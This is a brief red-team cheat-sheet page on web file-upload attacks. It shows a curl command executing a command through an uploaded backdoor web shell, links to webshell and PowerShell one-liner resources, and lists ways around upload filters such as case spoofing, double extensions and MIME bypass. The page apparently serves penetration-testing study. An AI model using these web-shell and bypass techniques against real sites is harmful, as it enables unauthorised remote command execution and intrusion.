---
title: File Upload
parent: Web Attack
grand_parent: Red Team
---


<details markdown="1">
<summary>File Upload</summary>
# File Upload

```bash
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
```

#### Example:
- [Create Powershell Oneliner](../99_attack_repo/01-50_web/web_fileupload.md)
- [If you can't use nc](../99_attack_repo/01-50_web/web_fileupload.md)
- [If there are restrictions on uploading ASP and ASPX files](https://github.com/yangbaopeng/ashx_webshell)
- [Using Non-Executable Files]()

👉 Try:

* `.php`
* extension spoofing(`.pHP`)
* double extension (`shell.php.jpg`)
* MIME bypass

→ If success → execute shell

</details>